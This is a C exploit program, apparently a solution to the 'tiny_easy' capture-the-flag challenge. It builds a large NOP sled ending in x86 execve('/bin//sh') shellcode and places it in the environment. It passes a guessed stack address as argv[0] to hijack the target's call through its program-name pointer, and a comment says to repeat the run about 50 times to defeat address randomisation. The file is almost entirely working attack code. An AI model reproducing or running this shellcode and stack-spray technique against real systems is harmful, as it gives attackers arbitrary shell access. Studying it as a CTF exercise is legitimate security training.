#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define prog_name "/home/tiny_easy/tiny_easy"
#define ret_addr 0xff886789
#define num_nops 0x15000

//LOAD:08048054
//LOAD:08048054
//LOAD:08048054 ; Attributes: noreturn
//LOAD:08048054
//LOAD:08048054 public start
//LOAD:08048054 start proc near
//LOAD:08048054 pop     eax
//LOAD:08048055 pop     edx ## program name pointer
//LOAD:08048056 mov     edx, [edx]
//LOAD:08048058 call    edx


//for debugging:
//source /usr/share/peda/peda.py
//set follow-fork-mode child
//catch exec


//run with:
//for _ in {0..50}; do ./tiny_easy_exp; done


char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";
char* get_payload()
{
    char* payload = malloc(strlen(shellcode) + num_nops);
    if (payload == NULL)
    {
        printf("malloc failed :(\n");
        exit(EXIT_FAILURE);
    }
    memset(payload, 0x90, num_nops);
    memcpy((char*) (payload + num_nops),shellcode,strlen(shellcode));
    return payload;
}
int main()
{
    int ret_address = ret_addr;

    char* payload = get_payload();
    char* envp[] = {
        payload,
        0
    };
    char* argv[] = {
        (char*) &ret_address,
        0
    };

    execve(prog_name,argv,envp);


}